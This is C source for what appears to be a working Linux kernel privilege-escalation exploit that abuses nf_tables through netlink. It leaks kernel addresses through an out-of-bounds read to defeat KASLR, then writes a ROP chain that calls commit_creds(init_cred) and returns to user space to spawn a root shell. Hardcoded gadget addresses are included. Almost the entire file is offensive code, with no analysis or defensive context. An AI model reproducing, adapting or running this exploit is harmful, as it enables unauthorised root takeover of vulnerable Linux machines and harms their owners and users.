#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <inttypes.h>
#include <sched.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdarg.h>

#include "netlink.h"

#define RULE_LEAK_ADDRESS 0
#define RULE_ROP_CHAIN 1

struct udp_data {
	char* data;
	size_t size;
	uint16_t port;
	char* addr;
	size_t addr_size;
};

struct listener_data {
	uint16_t port;
	char address[8];
};


uint32_t leak_expr_dreg = NFT_REG32_00;
static struct nftnl_rule *setup_rule_for_leak(uint8_t family, const char *table, const char *chain, uint16_t port) {
	puts("[+] Try to bypass kaslr");
	struct nftnl_rule *r = NULL;
	r = nftnl_rule_alloc();
	if (r == NULL) fail_exit("nftnl_rule_alloc()");

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// 检查 udp 端口
	// port at offset = 2 | len = 2
	puts("[+]  add_cmp to check port");
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2, NFT_REG32_01);
	uint16_t port_net = htons(port);
	add_cmp(r, NFT_CMP_EQ, NFT_REG32_01, &port_net, sizeof(port_net));
	
	// leak kernel address
//	puts("[+]  add_bitwise to oob read");
//	uint32_t expr_len = 0x20;
//	uint32_t expr_sreg = NFT_REG32_01;
//	uint32_t expr_dreg = NFT_REG32_05;
//	uint32_t shift_data = 0;
//	add_bitwise(r, NFT_BITWISE_LSHIFT, expr_len, expr_sreg, expr_dreg, shift_data);

	puts("[+]  add_payload_set to get leak data");
	add_payload_set(r, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 0x40, leak_expr_dreg);
	set_verdict(r, NFT_CONTINUE);

	return r;
}

static struct nftnl_rule *setup_rule_for_rop(uint8_t family, const char *table, const char *chain, uint16_t port) {
	puts("[+] Try to write rop chain");
	struct nftnl_rule *r = NULL;
	r = nftnl_rule_alloc();
	if (r == NULL) fail_exit("nftnl_rule_alloc()");

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	puts("[+]  add_payload to write rop chain");
	add_payload(r, 	NFT_PAYLOAD_TRANSPORT_HEADER, 8, 0xf0, 0xffffffcc);
	set_verdict(r, NFT_CONTINUE);
	
	return r;
}

void add_rule(char *table_name, char *chain_name, char rule_type, uint16_t port) {
	struct mnl_socket *nl;
	struct nftnl_rule *r;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL);
	int ret;

	family = NFPROTO_IPV4;

	if (rule_type == RULE_LEAK_ADDRESS)
		r = setup_rule_for_leak(family, table_name, chain_name, port);
	else if (rule_type == RULE_ROP_CHAIN)
		r = setup_rule_for_rop(family, table_name, chain_name, port);
	else fail_exit("No such rule type");
	if (r == NULL) fail_exit("setup_rule");

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) fail_exit("mnl_socket_open()");
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
		fail_exit("mnl_socket_bind()");
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
				    NFT_MSG_NEWRULE,
				    nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
				    NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
				    seq++);
	nftnl_rule_nlmsg_build_payload(nlh, r);
	nftnl_rule_free(r);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) fail_exit("mnl_socket_sendto()");
	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	if (ret == -1) fail_exit("mnl_socket_recvfrom()");

	ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl), NULL, NULL);
	if (ret < 0) fail_exit("mnl_cb_run()");
	mnl_socket_close(nl);
}

int e = 1;
int g = 1;
void* send_udp_packet(void *arg) {
	struct udp_data *leak_udp = (struct udp_data*)arg;
	int fd;
	struct sockaddr_in addr;

	while (g) {}
	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (fd < 0) fail_exit("socket()");

	addr.sin_family = AF_INET;
	addr.sin_port = htons(leak_udp->port);
	addr.sin_addr.s_addr = inet_addr(leak_udp->addr);

	if (sendto(fd, leak_udp->data, leak_udp->size, 0, &addr, sizeof(addr)) < 0)
		fail_exit("sendto()");
	while (e) {}
	close(fd);
	pthread_exit(NULL);
}

void* recv_address(void* arg) {
	struct listener_data *ldata = (struct listener_data*)arg;
	int fd, res;	
	char buf[1024] = { 0 };
	struct sockaddr_in addr;
	
	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (fd < 0) fail_exit("socket()");

	int reuse_address = 1;
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse_address, sizeof(reuse_address));

	if (!inet_aton("127.0.0.1", &addr.sin_addr.s_addr)) fail_exit("inet_aton()");
	addr.sin_family = AF_INET;
	addr.sin_port = htons(ldata->port);
	
	res = bind(fd, &addr, sizeof(addr));
	if (res < 0) fail_exit("bind()");
	printf("[+] Listening on port %d\n", ldata->port);
	g = 0;

	int addr_len = sizeof(struct sockaddr_in);	
	res = recvfrom(fd, buf, 1024-1, MSG_WAITALL, (struct sockaddr*)&addr, &addr_len);
	if (res == -1) fail_exit("recvform()");
	buf[res] = '\x00';
	printf("[+] recvform data len: %d\n", res);
	binary_dump("Leak Data", buf, res);
	uint64_t dic[2] = { 0xffffffff81b634ae, 0xffffffff81b5fd39 };
	uint64_t *ptr = (uint64_t*)buf;
	for (int i = 0; i < res / 8; i++) {
		for (int j = 0; j < 2; j++) {
			if ((ptr[i]&0xfff) == (dic[j]&0xfff) && ((ptr[i]>>32)&0xffffffff) == 0xffffffff 
					&& ptr[i] > 0xffffffff81000000) {
				ptr[i] = ptr[i] - dic[j];
				memcpy(&ldata->address, &ptr[i], 8);
				goto OVER;
			}
		}
	}

OVER:
	e = 0;
	pthread_exit(NULL);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

int main() {

	unshare_setup();
	save_status();
	system("ip link set dev lo up");
	system("ip addr");
	puts("");
	uint64_t kbase = 0xffffffff81000000;
	uint64_t koffset = 0;
	uint16_t port = 40004;
	pthread_t send_thr, recv_thr;

	puts("[+] Step I: Bypass kaslr");
	char *table_name = "leak_table";
	char *chain_name = "leak_chain";
	setup_table_and_chain(table_name, chain_name, NF_INET_LOCAL_OUT);
	add_rule(table_name, chain_name, RULE_LEAK_ADDRESS, port);

	struct udp_data leak_udp = { 0 };
	char *data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	char *addr = "127.0.0.1";
	leak_udp.data = data;
	leak_udp.size = 0x40;
	leak_udp.port = port;
	leak_udp.addr = addr;
	leak_udp.addr_size = sizeof(leak_udp.addr);
	pthread_create(&send_thr, NULL, send_udp_packet, (void*)&leak_udp);
	
	struct listener_data recv_data;
	memset(&recv_data, 0, sizeof(recv_data));
	recv_data.port = port;
	pthread_create(&recv_thr, NULL, recv_address, (void*)&recv_data);

	pthread_join(send_thr, NULL);
	pthread_join(recv_thr, NULL);

	dele_table(table_name);
	koffset = *(uint64_t*)recv_data.address;
	kbase += koffset;
	printf("[+] koffset: %#llx\n", koffset);
	printf("[+] kbase: %#llx\n", kbase);
	puts("");
	

	puts("[+] Step II: Rop chain");
	port += 10000;
	table_name = "rop_table";
	chain_name = "rop_chain";
	setup_table_and_chain(table_name, chain_name, NF_INET_LOCAL_OUT);
	add_rule(table_name, chain_name, RULE_ROP_CHAIN, port);
	
	uint64_t pop_rdi = koffset+0xffffffff810ade60;
	uint64_t pop_rsi = koffset+0xffffffff811a99a9;
	uint64_t commit_creds = koffset+0xffffffff810fb090;
	uint64_t init_cred = koffset+0xffffffff82a8b040;
	uint64_t find_task_by_vpid = koffset+0xffffffff810f1070;
	uint64_t switch_task_namespaces = koffset+0xffffffff810f92a0;
	uint64_t init_nsproxy = koffset+0xffffffff82a8ae00;
	uint64_t kpti_trampoline = koffset+0xffffffff82000ff0+0x1b;
	uint64_t push_rax = koffset+0xffffffff810494b8;
	uint64_t magic = koffset+0xffffffff81a1c02c; // push rax ; pop rdi ; jle 0xffffffff81a1c030 ; pop rbp ; xor esi, esi ; xor edi, edi ; ret
	struct udp_data rop_udp = { 0 };
	uint64_t rop[0x100/8] = {
		pop_rdi,
		init_cred,
		commit_creds,
	//	pop_rdi,
	//	getpid(),
	//	find_task_by_vpid,
	//	magic,
	//	0,
	//	pop_rsi,
	//	init_nsproxy,
	//	switch_task_namespaces,
		kpti_trampoline,
		0,0,
		get_root_shell,
		user_cs,
		user_rflags,
		user_sp,
		user_ss
	};
	char payload[0x200] = { 0 };
	memcpy(payload+0x14, rop, sizeof(rop));
	rop_udp.data = payload;
	rop_udp.size = 0x100;
	rop_udp.port = port;
	rop_udp.addr = addr;
	rop_udp.addr_size = sizeof(rop_udp.addr);
	e = g = 0;
	pthread_create(&send_thr, NULL, send_udp_packet, (void*)&rop_udp);
	pthread_join(send_thr, NULL);

	puts("[+] EXP NERVER END");
	getchar();
	return 0;
}
